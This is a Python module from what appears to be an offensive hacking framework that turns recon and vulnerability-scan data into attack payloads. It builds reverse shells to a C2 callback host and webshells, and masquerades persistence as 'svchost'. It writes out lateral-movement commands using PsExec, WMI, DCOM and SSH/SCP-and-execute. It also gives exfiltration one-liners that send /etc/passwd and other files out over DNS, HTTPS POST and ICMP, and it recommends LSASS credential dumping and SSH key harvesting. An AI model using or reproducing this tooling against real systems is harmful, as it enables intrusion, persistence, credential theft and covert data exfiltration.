"""
Intelligent payload selection based on full context.
Integrates recon data + vulnerability findings to produce optimal payloads.
"""
from typing import Dict, List, Optional, Tuple
from .adaptive import AdaptivePayloadGenerator


class PayloadSelector:
    """
    Selects and generates optimal payloads based on:
    - Target fingerprint from recon
    - Vulnerability findings from scanning
    - Operational objective
    """
    
    def __init__(self):
        self.generator = AdaptivePayloadGenerator()
    
    def select_for_target(
        self,
        recon_data: Dict,
        vuln_findings: List[Dict],
        objective: str,
        callback_host: str = "CALLBACK_HOST",
        callback_port: int = 4444
    ) -> Dict:
        """
        Select and generate payloads for specific target + objective.
        
        Args:
            recon_data: Output from recon pipeline
            vuln_findings: Output from vulnerability scanner
            objective: initial_access, persistence, lateral, exfiltration
            callback_host: C2 callback host
            callback_port: C2 callback port
            
        Returns:
            Dict with categorized payloads and recommendations
        """
        
        fingerprint = self._build_fingerprint(recon_data)
        waf_detected = self._detect_waf(recon_data)
        av_detected = self._detect_av(recon_data)
        
        result = {
            "fingerprint": fingerprint,
            "defenses": {
                "waf": waf_detected,
                "av": av_detected
            },
            "objective": objective,
            "payloads": [],
            "recommendations": []
        }
        
        if objective == "initial_access":
            result["payloads"] = self._generate_initial_access_payloads(
                fingerprint, vuln_findings, waf_detected, av_detected,
                callback_host, callback_port
            )
            result["recommendations"] = self._recommend_initial_access(fingerprint, vuln_findings)
            
        elif objective == "persistence":
            result["payloads"] = self._generate_persistence_payloads(
                fingerprint, av_detected, callback_host, callback_port
            )
            result["recommendations"] = self._recommend_persistence(fingerprint)
            
        elif objective == "lateral":
            result["payloads"] = self._generate_lateral_payloads(
                fingerprint, waf_detected, av_detected
            )
            result["recommendations"] = self._recommend_lateral(fingerprint)
            
        elif objective == "exfiltration":
            result["payloads"] = self._generate_exfil_payloads(fingerprint)
            result["recommendations"] = self._recommend_exfil(fingerprint)
        
        return result
    
    def _generate_initial_access_payloads(
        self,
        fingerprint: Dict,
        vuln_findings: List[Dict],
        waf_detected: bool,
        av_detected: bool,
        callback_host: str,
        callback_port: int
    ) -> List[Dict]:
        """Generate payloads for initial access."""
        
        payloads = []
        
        # Generate reverse shells
        shell = self.generator.generate_reverse_shell(
            host=callback_host,
            port=callback_port,
            fingerprint=fingerprint,
            waf_detected=waf_detected,
            av_detected=av_detected
        )
        payloads.append({"category": "reverse_shell", **shell})
        
        # Generate webshell if web vulns found
        web_vuln_types = ["sqli", "file_upload", "rce", "lfi", "rfi", "xxe"]
        if any(v.get("type", "").lower() in web_vuln_types for v in vuln_findings):
            webshell = self.generator.generate_webshell(fingerprint, stealth_level=2)
            payloads.append({"category": "webshell", **webshell})
        
        # Generate injection payloads based on vuln types
        for vuln in vuln_findings:
            vuln_type = vuln.get("type", "").lower()
            if vuln_type in ["sqli", "xss", "rce", "lfi"]:
                injections = self.generator.generate_injection_payload(
                    injection_type=vuln_type,
                    waf_detected=waf_detected,
                    target_db=vuln.get("database")
                )
                payloads.append({
                    "category": "injection",
                    "vuln_type": vuln_type,
                    "target": vuln.get("url", vuln.get("target")),
                    "parameter": vuln.get("parameter"),
                    "payloads": injections
                })
        
        # Generate callback verification
        callback = self.generator.generate_callback(callback_host, callback_port)
        payloads.append({"category": "callback", **callback})
        
        return payloads
    
    def _generate_persistence_payloads(
        self,
        fingerprint: Dict,
        av_detected: bool,
        callback_host: str,
        callback_port: int
    ) -> List[Dict]:
        """Generate payloads for persistence."""
        
        payloads = []
        
        # Generate shell to persist
        shell = self.generator.generate_reverse_shell(
            host=callback_host,
            port=callback_port,
            fingerprint=fingerprint,
            av_detected=av_detected
        )
        
        # Generate persistence mechanisms
        persistence = self.generator.generate_persistence(
            fingerprint=fingerprint,
            payload=shell["payload"],
            name="svchost"
        )
        
        for p in persistence:
            payloads.append({
                "category": "persistence",
                **p
            })
        
        return payloads
    
    def _generate_lateral_payloads(
        self,
        fingerprint: Dict,
        waf_detected: bool,
        av_detected: bool
    ) -> List[Dict]:
        """Generate payloads for lateral movement."""
        
        payloads = []
        os_type = fingerprint.get("os", "linux").lower()
        
        if os_type == "windows":
            # Windows lateral movement
            payloads.extend([
                {
                    "category": "lateral",
                    "method": "psexec",
                    "payload": "psexec.exe \\\\TARGET -u DOMAIN\\USER -p PASS cmd.exe",
                    "description": "PsExec remote execution"
                },
                {
                    "category": "lateral",
                    "method": "wmi",
                    "payload": "wmic /node:TARGET /user:USER /password:PASS process call create 'cmd.exe /c COMMAND'",
                    "description": "WMI remote execution"
                },
                {
                    "category": "lateral",
                    "method": "winrm",
                    "payload": "Invoke-Command -ComputerName TARGET -ScriptBlock {COMMAND} -Credential (Get-Credential)",
                    "description": "WinRM/PowerShell remoting"
                },
                {
                    "category": "lateral",
                    "method": "dcom",
                    "payload": "$c = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET'));$c.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c COMMAND','7')",
                    "description": "DCOM lateral movement"
                },
            ])
        else:
            # Linux lateral movement
            payloads.extend([
                {
                    "category": "lateral",
                    "method": "ssh",
                    "payload": "ssh -i KEY USER@TARGET 'COMMAND'",
                    "description": "SSH key-based movement"
                },
                {
                    "category": "lateral",
                    "method": "ssh_tunnel",
                    "payload": "ssh -L LOCAL_PORT:INTERNAL_TARGET:TARGET_PORT USER@PIVOT",
                    "description": "SSH port forwarding"
                },
                {
                    "category": "lateral",
                    "method": "scp",
                    "payload": "scp PAYLOAD USER@TARGET:/tmp/ && ssh USER@TARGET 'chmod +x /tmp/PAYLOAD && /tmp/PAYLOAD'",
                    "description": "SCP + execute"
                },
            ])
        
        return payloads
    
    def _generate_exfil_payloads(self, fingerprint: Dict) -> List[Dict]:
        """Generate payloads for exfiltration."""
        
        payloads = []
        os_type = fingerprint.get("os", "linux").lower()
        
        # DNS exfil
        payloads.append({
            "category": "exfiltration",
            "method": "dns",
            "payload": "for b in $(cat /etc/passwd | base64 -w32); do dig $b.DOMAIN; done" if os_type != "windows" else "[Convert]::ToBase64String([IO.File]::ReadAllBytes('FILE')).ToCharArray() | ForEach-Object {$c+=$_;if($c.Length -eq 32){nslookup $c.DOMAIN;$c=''}}",
            "description": "DNS tunneling exfiltration"
        })
        
        # HTTPS exfil
        payloads.append({
            "category": "exfiltration",
            "method": "https",
            "payload": "curl -X POST -d @FILE https://DOMAIN/upload" if os_type != "windows" else "Invoke-WebRequest -Uri 'https://DOMAIN/upload' -Method POST -InFile FILE",
            "description": "HTTPS POST exfiltration"
        })
        
        # ICMP exfil
        if os_type != "windows":
            payloads.append({
                "category": "exfiltration",
                "method": "icmp",
                "payload": "xxd -p -c4 FILE | while read b; do ping -c1 -p $b HOST; done",
                "description": "ICMP data exfiltration"
            })
        
        return payloads
    
    def _recommend_initial_access(
        self,
        fingerprint: Dict,
        vuln_findings: List[Dict]
    ) -> List[str]:
        """Generate recommendations for initial access."""
        
        recs = []
        
        # Analyze vulnerabilities
        vuln_types = [v.get("type", "").lower() for v in vuln_findings]
        vuln_severities = [v.get("severity", "").lower() for v in vuln_findings]
        
        if "rce" in vuln_types:
            recs.append("PRIORITY: RCE vulnerability found - direct command execution available")
        if "file_upload" in vuln_types:
            recs.append("Webshell deployment possible via file upload")
        if "sqli" in vuln_types:
            recs.append("SQL injection for data access or potential command execution")
        if "lfi" in vuln_types:
            recs.append("LFI may allow code execution via log poisoning or wrapper abuse")
        
        # OS-specific recommendations
        os_type = fingerprint.get("os", "linux").lower()
        if os_type == "windows":
            recs.append("Windows target: Consider PowerShell-based payloads for stealth")
            recs.append("Check for exposed RDP, WinRM, SMB for alternate access")
        else:
            recs.append("Linux target: Check for SSH, cron abuse, or service exploitation")
        
        # Defense recommendations
        if not recs:
            recs.append("No high-value vulnerabilities found - consider phishing or supply chain")
        
        return recs
    
    def _recommend_persistence(self, fingerprint: Dict) -> List[str]:
        """Generate persistence recommendations."""
        
        os_type = fingerprint.get("os", "linux").lower()
        recs = []
        
        if os_type == "windows":
            recs.extend([
                "Registry run keys for user-level persistence",
                "Scheduled tasks for system-level persistence",
                "WMI subscriptions for stealthy persistence",
                "Service creation for privileged persistence"
            ])
        else:
            recs.extend([
                "Crontab for scheduled execution",
                "Systemd service for persistent daemon",
                ".bashrc/.profile for user shell persistence",
                "SSH authorized_keys for access persistence"
            ])
        
        return recs
    
    def _recommend_lateral(self, fingerprint: Dict) -> List[str]:
        """Generate lateral movement recommendations."""
        
        os_type = fingerprint.get("os", "linux").lower()
        
        if os_type == "windows":
            return [
                "Extract credentials with Mimikatz/LSASS dump",
                "Use PsExec/WMI/WinRM for execution",
                "Check for cached credentials and Kerberos tickets",
                "Enumerate AD for high-value targets"
            ]
        else:
            return [
                "Harvest SSH keys from user directories",
                "Check for password reuse across systems",
                "Look for NFS shares or trust relationships",
                "Enumerate sudo permissions for privilege paths"
            ]
    
    def _recommend_exfil(self, fingerprint: Dict) -> List[str]:
        """Generate exfiltration recommendations."""
        
        return [
            "DNS tunneling for stealth (slow but hard to detect)",
            "HTTPS to legitimate-looking domains (blends with traffic)",
            "Staged exfil to avoid large transfer detection",
            "Consider encryption before exfil"
        ]
    
    def _build_fingerprint(self, recon_data: Dict) -> Dict:
        """Build fingerprint from recon data."""
        
        fp = {
            "os": "linux",
            "technology": "unknown",
            "languages": [],
            "services": [],
            "domain": None
        }
        
        # Extract from HTTP phase
        if "http" in recon_data.get("phases", {}):
            for host_data in recon_data["phases"]["http"]:
                if isinstance(host_data, dict):
                    techs = host_data.get("technologies", [])
                    if isinstance(techs, list):
                        for tech in techs:
                            tech_lower = tech.lower() if isinstance(tech, str) else ""
                            if any(x in tech_lower for x in ["iis", "aspnet", "asp.net", "windows"]):
                                fp["os"] = "windows"
                            if "php" in tech_lower:
                                fp["languages"].append("php")
                            if any(x in tech_lower for x in ["python", "django", "flask"]):
                                fp["languages"].append("python")
                            if any(x in tech_lower for x in ["node", "express"]):
                                fp["languages"].append("node")
                            if any(x in tech_lower for x in ["java", "jsp", "tomcat"]):
                                fp["languages"].append("java")
                            if any(x in tech_lower for x in ["ruby", "rails"]):
                                fp["languages"].append("ruby")
                        fp["technology"] = ", ".join(techs) if techs else "unknown"
        
        # Extract from port scan phase
        if "ports" in recon_data.get("phases", {}):
            for port_data in recon_data["phases"]["ports"]:
                if isinstance(port_data, dict):
                    service = port_data.get("service", "")
                    if service:
                        fp["services"].append(service)
                    # OS hints from services
                    if any(x in service.lower() for x in ["microsoft", "windows", "rdp", "smb"]):
                        fp["os"] = "windows"
        
        # Extract domain
        if "subdomains" in recon_data.get("phases", {}):
            subs = recon_data["phases"]["subdomains"]
            if isinstance(subs, list) and subs:
                first = subs[0]
                if isinstance(first, dict):
                    fp["domain"] = first.get("domain")
                elif isinstance(first, str):
                    parts = first.split(".")
                    if len(parts) >= 2:
                        fp["domain"] = ".".join(parts[-2:])
        
        fp["languages"] = list(set(fp["languages"]))
        
        return fp
    
    def _detect_waf(self, recon_data: Dict) -> bool:
        """Detect WAF from recon data."""
        
        waf_indicators = [
            "cloudflare", "akamai", "incapsula", "imperva", 
            "sucuri", "aws waf", "cloudfront", "barracuda",
            "f5", "fortinet", "modsecurity"
        ]
        
        if "http" in recon_data.get("phases", {}):
            for host_data in recon_data["phases"]["http"]:
                if isinstance(host_data, dict):
                    # Check technologies
                    techs = host_data.get("technologies", [])
                    for tech in techs:
                        if any(waf in tech.lower() for waf in waf_indicators):
                            return True
                    
                    # Check headers
                    headers = host_data.get("headers", {})
                    header_str = str(headers).lower()
                    if any(waf in header_str for waf in waf_indicators):
                        return True
                    if "waf" in header_str or "firewall" in header_str:
                        return True
        
        return False
    
    def _detect_av(self, recon_data: Dict) -> bool:
        """Detect AV/EDR indicators."""
        
        # AV/EDR detection requires active probing
        # This is a placeholder - real detection would come from
        # active recon or initial foothold enumeration
        
        av_indicators = [
            "crowdstrike", "carbon black", "sentinel", "defender",
            "symantec", "mcafee", "kaspersky", "eset", "sophos"
        ]
        
        # Check if we have any service enumeration data
        if "services" in recon_data:
            services_str = str(recon_data["services"]).lower()
            if any(av in services_str for av in av_indicators):
                return True
        
        return False
    
    def select_for_vulnerability(
        self,
        vuln: Dict,
        fingerprint: Optional[Dict] = None
    ) -> List[Dict]:
        """
        Generate payloads for a specific vulnerability.
        
        Args:
            vuln: Single vulnerability finding
            fingerprint: Optional target fingerprint
            
        Returns:
            List of applicable payloads
        """
        
        vuln_type = vuln.get("type", "").lower()
        waf_detected = vuln.get("waf_detected", False)
        
        payloads = self.generator.generate_injection_payload(
            injection_type=vuln_type,
            waf_detected=waf_detected,
            target_db=vuln.get("database")
        )
        
        return payloads
